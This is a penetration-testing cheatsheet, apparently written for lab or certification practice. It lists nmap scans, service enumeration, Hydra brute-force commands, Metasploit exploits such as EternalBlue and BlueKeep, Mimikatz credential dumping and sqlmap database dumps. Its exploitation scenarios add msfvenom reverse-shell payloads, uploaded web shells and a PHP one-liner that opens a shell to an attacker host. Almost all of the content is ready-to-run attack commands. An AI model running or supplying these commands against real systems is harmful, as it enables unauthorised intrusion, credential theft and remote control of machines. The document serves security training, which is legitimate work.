# Penetration Testing Cheatsheet 
```
                                   _
       /      \         __      _\( )/_
    \  \  ,,  /  /   | /  \ |    /(O)\ 
     '-.`\()/`.-'   \_\\  //_/    _.._   _\(o)/_  //  \\
    .--_'(  )'_--.   .'/()\'.   .'    '.  /(_)\  _\\()//_
   / /` /`""`\ `\ \   \\  //   /   __   \       / //  \\ \
    |  |  ><  |  |          ,  |   ><   |  ,     | \__/ |
    \  \      /  /         . \  \      /  / .              _
   _    '.__.'    _\(O)/_   \_'--`(  )'--'_/     __     _\(_)/_
_\( )/_            /(_)\      .--'/()\'--.    | /  \ |   /(O)\
 /(O)\  //  \\         _     /  /` '' `\  \  \_\\  //_/
       _\\()//_     _\(_)/_    |        |      //()\\ 
      / //  \\ \     /(o)\      \      /       \\  //
       | \__/ |
```

**A comprehensive guide for network, system, and web application pentesting.**

---

## PART 1: Assessment Methodologies & Auditing

### Host Discovery
- **Ping Scan**: `sudo nmap -sn <TARGET_IP/NETWORK>`  
- **ARP Scan**: `netdiscover -i eth1 -r <TARGET_IP/NETWORK>`

### Nmap Port Scanning
| Scan Type          | Command                                | Description                 |
| ------------------ | -------------------------------------- | --------------------------- |
| Basic              | `nmap <TARGET_IP>`                     | Default scan                |
| Skip Ping          | `nmap -Pn <TARGET_IP>`                 | No ping assumption          |
| All Ports          | `nmap -p- <TARGET_IP>`                 | Scans all 65,535 ports      |
| Specific Port (80) | `nmap -p 80 <TARGET_IP>`               | Targets port 80 only        |
| Custom Ports       | `nmap -p 80,445,3389,8080 <TARGET_IP>` | Scans listed ports          |
| Port Range         | `nmap -p1-2000 <TARGET_IP>`            | Scans ports 1-2000          |
| Fast & Verbose     | `nmap -F <TARGET_IP> -v`               | Quick scan with details     |
| UDP Scan           | `nmap -sU <TARGET_IP>`                 | UDP protocol scan           |
| Service Detection  | `nmap -sV <TARGET_IP>`                 | Identifies service versions |
| Service + OS       | `sudo nmap -sV -O <TARGET_IP>`         | Adds OS detection           |
| Default Scripts    | `nmap -sC <TARGET_IP>`                 | Runs default NSE scripts    |
| Combo Scan         | `nmap -Pn -F -sV -O -sC <TARGET_IP>`   | Comprehensive scan          |
| Aggressive         | `nmap -Pn -F -A <TARGET_IP>`           | All-in-one aggressive scan  |

---

## PART 2: Host & Network Penetration Testing

### I. Enumeration

#### 1. SMB
**Nmap Commands**  
- Basic: `sudo nmap -p 445 -sV -sC -O <TARGET_IP>`  
- Top UDP Ports: `nmap -sU --top-ports 25 --open <TARGET_IP>`  
- SMB Scripts:  
  - `nmap -p 445 --script smb-protocols <TARGET_IP>`  
  - `nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>`  
  - `nmap -p 445 --script smb-os-discovery <TARGET_IP>`  

**SMBMap**  
- Guest: `smbmap -u guest -p "" -d . -H <TARGET_IP>`  
- Creds: `smbmap -u <USER> -p '<PW>' -H <TARGET_IP>`  
- RCE: `smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'`  
- Drives: `smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -L`  
- Dir List: `smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -r 'C$'`  
- Upload: `smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/backdoor' 'C$\backdoor'`  
- Download: `smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'`

**SMBClient**  
- List Shares: `smbclient -L <TARGET_IP> -N`  
- Connect Anon: `smbclient //<TARGET_IP>/public -N`  
- With User: `smbclient -L <TARGET_IP> -U <USER>`  
- Commands: `help`, `ls`, `get <filename>`

**Rpcclient**  
- Anon: `rpcclient -U "" -N <TARGET_IP>`  
- Commands: `enumdomusers`, `enumdomgroups`, `lookupnames admin`

**Enum4linux**  
- All Options: `enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>`  
- Users: `enum4linux -U <TARGET_IP>`  
- Shares: `enum4linux -S <TARGET_IP>`  

**Hydra**  
- `hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb`

**Metasploit**  
- `use auxiliary/scanner/smb/smb_version`  
- `use auxiliary/scanner/smb/smb_login`

#### 2. FTP
- Anon Check: `nmap --script ftp-anon -p21 <TARGET_IP>`  
- Connect: `ftp <TARGET_IP>`  
- Brute-Force: `hydra -L <USERS_LIST> -P <PW_LIST> <TARGET_IP> ftp`

#### 3. SSH
- Version Scan: `nmap -p 22 -sV -sC -O <TARGET_IP>`  
- Brute-Force: `hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh`

#### 4. HTTP
- Web Scan: `whatweb <TARGET_IP>`  
- Nmap: `nmap --script=http-enum -sV -p80 <TARGET_IP>`  
- Dirb: `dirb http://<TARGET_IP> <WORDLIST>`

#### 5. MySQL
- Empty PW Check: `nmap -p 3306 --script=mysql-empty-password <TARGET_IP>`  
- Brute-Force: `hydra -l <USER> -P <PW_LIST> <TARGET_IP> mysql`

#### 6. MSSQL
- Info: `nmap -p 1433 --script ms-sql-info <TARGET_IP>`  
- Brute-Force: `nmap -p 3306 --script ms-sql-brute <TARGET_IP>`

#### 7. SMTP
- Scan: `sudo nmap -p 25 -sV -sC -O <TARGET_IP>`  
- Enum: `smtp-user-enum -U <USER_LIST> -t <TARGET_IP>`

#### 8. Vulnerability Assessment
- Heartbleed: `nmap -sV --script ssl-heartbleed -p 443 <TARGET_IP>`  
- EternalBlue: `nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>`  
- Log4j: `nmap --script log4shell.nse -p 8080 <TARGET_IP>`

---

## PART 2: System/Host-Based Attacks

### I. Windows Exploitation

#### 1. IIS WebDAV
- Scan: `nmap -p80 --script http-enum -sV <TARGET_IP>`  
- Brute-Force: `hydra -L <USER_LIST> -P <PW_LIST> <TARGET_IP> http-get /webdav/`  
- Upload Shell: `cadaver http://<TARGET_IP>/webdav` → `put /path/to/shell.asp`

#### 2. SMB
- EternalBlue: `use exploit/windows/smb/ms17_010_eternalblue`  
- PsExec: `use exploit/windows/smb/psexec` → `set SMBUser <USER>`

#### 3. RDP
- Scan: `use auxiliary/scanner/rdp/rdp_scanner`  
- BlueKeep: `use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`

#### 4. WinRM
- Brute-Force: `crackmapexec winrm <TARGET_IP> -u <USER> -p <PW_LIST>`  
- Shell: `evil-winrm -i <IP> -u <USER> -p <PW>`

#### 5. Privilege Escalation
- Exploit Suggester: `use post/multi/recon/local_exploit_suggester`  
- UAC Bypass: `exploit/windows/local/bypassuac_eventvwr`

#### 6. Credential Dumping
- Kiwi: `load kiwi` → `creds_all`  
- Mimikatz: `mimikatz.exe` → `sekurlsa::logonPasswords`

### II. Linux Exploitation

#### 1. FTP
- Brute-Force: `hydra -L <USER_LIST> -P <PW_LIST> <TARGET_IP> ftp`

#### 2. SSH
- Brute-Force: `hydra -L <USER_LIST> -P <PW_LIST> <TARGET_IP> ssh`

#### 3. Samba
- Enum: `enum4linux -a <TARGET_IP>`

#### 4. Privilege Escalation
- Kernel Exploits: `./linux-exploit-suggester.sh`  
- SUID: `find / -perm -u=s -type f 2>/dev/null`

#### 5. Pivoting
- Autoroute: `run autoroute -s <SUBNET>`  
- Port Forward: `portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <TARGET_IP>`

---

## PART 3: Web Application Penetration Testing

### Recon
- **Scan**: `nmap -sS -sV -p 80,443,3306 <TARGET_IP>`  
- **Dirbuster**: `dirb http://<TARGET_IP>`  
- **Gobuster**:  
  - `gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 403,404`  
  - `gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r`  
  - `gobuster dir -u http://<TARGET_IP>/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r`

### Tools
#### CURL
- Headers: `curl -I <TARGET_IP>`  
- Methods:  
  - `curl -X GET <TARGET_IP>`  
  - `curl -X OPTIONS <TARGET_IP> -v`  
  - `curl -X POST <TARGET_IP>`  
  - `curl -X POST <TARGET_IP>/login.php -d "name=john&password=password" -v`  
  - `curl -X PUT <TARGET_IP>`  
- File Ops:  
  - Upload: `curl <TARGET_IP>/uploads/ --upload-file hello.txt`  
  - Delete: `curl -X DELETE <TARGET_IP>/uploads/hello.txt -v`

#### Nikto
- Basic: `nikto -h http://<TARGET_IP> -o niktoscan.txt`  
- Specific: `nikto -h http://<TARGET_IP>/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm`

#### SQLMap
- Basic: `sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title`  
- Request File: `sqlmap -r <REQUEST_FILE> -p <POST_PARAMETER>`  
- Enumeration:  
  - Databases: `sqlmap -u "<URL>" --dbs`  
  - Tables: `sqlmap -u "<URL>" -D bWAPP --tables`  
  - Columns: `sqlmap -u "<URL>" -D bWAPP -T users --columns`  
  - Dump: `sqlmap -u "<URL>" -D bWAPP -T users -C admin,password,email --dump`

#### XSSer
- Basic: `xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'`  
- Auto: `xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto`  
- Payload: `xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"`  
- Authenticated: `xsser --url "http://<TARGET_IP>/htmli_get.php?firstname=XSS&lastname=hi&form=submit" --cookie="PHPSESSID=lb3rg4q495t9sqph907sdhjgg1; security_level=0" --Fp "<script>alert(1)</script>"`

#### Hydra
- Basic Auth: `hydra -L <USERS_LIST> -P <PW_LIST> <TARGET_IP> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"`

---

## PART X: TroubleMakers - Exploitation Scenarios

### Scenario 1: IIS & FTP
- Scan: `nmap -sV -sC -p21,80 <TARGET_IP>`  
- Anon FTP: `ftp <TARGET_IP>`  
- Brute-Force: `hydra -L <USER_LIST> -P <PW_LIST> <TARGET_IP> ftp`  
- Shell:  
  - Generate: `msfvenom -p windows/shell/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f asp > shell.aspx`  
  - Upload: `ftp <TARGET_IP>` → `put shell.aspx`  
  - Listener: `use multi/handler` → `set payload windows/shell/reverse_tcp`

### Scenario 2: OpenSSH
- Scan: `nmap -sV -sC -p 22 <TARGET_IP>`  
- Exploit Search: `searchsploit OpenSSH 7.1`  
- Brute-Force: `hydra -l <USER> -P <PW_LIST> <TARGET_IP> ssh`  
- Login: `ssh <USER>@<TARGET_IP>`

### Scenario 3: SMB
- Scan: `nmap -sV -sC -p 445 <TARGET_IP>`  
- Brute-Force: `hydra -l <USER> -P <PW_LIST> <TARGET_IP> smb`  
- Enum: `smbclient -L <TARGET_IP> -U <USER>`  
- PsExec: `python3 psexec.py <USER>@<TARGET_IP>`  
- EternalBlue: `use exploit/windows/smb/ms17_010_eternalblue`

### Scenario 4: MySQL (WordPress)
- Scan: `nmap -sV -sC -p 3306,8585 <TARGET_IP>`  
- Brute-Force: `use auxiliary/scanner/mysql/mysql_login`  
- Login: `mysql -u root -p -h <TARGET_IP>` → `show databases;`

### Scenario 5: VSFTPD
- Scan: `nmap -sV -sC -p 21 <TARGET_IP>`  
- Exploit: `python3 49757.py <TARGET_IP>`  
- Shell Upload: `ftp <TARGET_IP>` → `put shell.php`  
- Listener: `nc -nvlp <PORT>`

### Scenario 6: Linux Exploitation
- Recon: `nmap -sV -p 1-10000 <TARGET_IP> -oX nmap_10k`  
- Enum: `cat /etc/*release`

### Scenario 7: PHP
- Scan: `nmap -sV -sC -p 80 <TARGET_IP>`  
- Exploit: `python2 18836.py <TARGET_IP> 80`  
- Shell: Modify with `pwn_code = "<?php $sock=fsockopen('<ATTACKER_IP>',<PORT>);exec('/bin/sh -i <&4 >&4 2>&4');?>"`

### Scenario 8: Samba
- Scan: `nmap -sV -p 445 <TARGET_IP>`  
- Exploit: `use exploit/multi/samba/usermap_script`

### Scenario 9 & 10: Windows Local Enumeration
- Meterpreter: `getuid`, `sysinfo`, `hashdump`  
- CMD: `systeminfo`, `net users`, `netstat -ano`  
- JAWS: `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1`

### Drupalgeddon 2 CMS Exploitation
- Recon: `nmap -Pn -sV -F <IP>`  
- Dir Enum: `gobuster dir --url http://<IP> --wordlist <DRUPAL_LIST>`  
- Exploit: `./drupalgeddon2.rb http://<IP>`  
- Reverse Shell: `msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe > rev.exe`  
- Privesc: `use exploit/windows/local/ms14_058_track_popup_menu`

---

## Quick Reference

### File Transfer
- Python Server: `python3 -m http.server <PORT>`  
- Windows: `certutil -urlcache -f http://<IP>/<FILE> <FILE>`

### Metasploit Modules
- SMB: `use auxiliary/scanner/smb/smb_version`  
- HTTP: `use auxiliary/scanner/http/http_version`  
- SSH: `use auxiliary/scanner/ssh/ssh_login`

### Meterpreter Commands
- `getuid`, `sysinfo`, `hashdump`, `migrate <PID>`, `shell`

---

*Happy hacking! Stay ethical and legal.*                                                                                                                                                        Mrx0rd
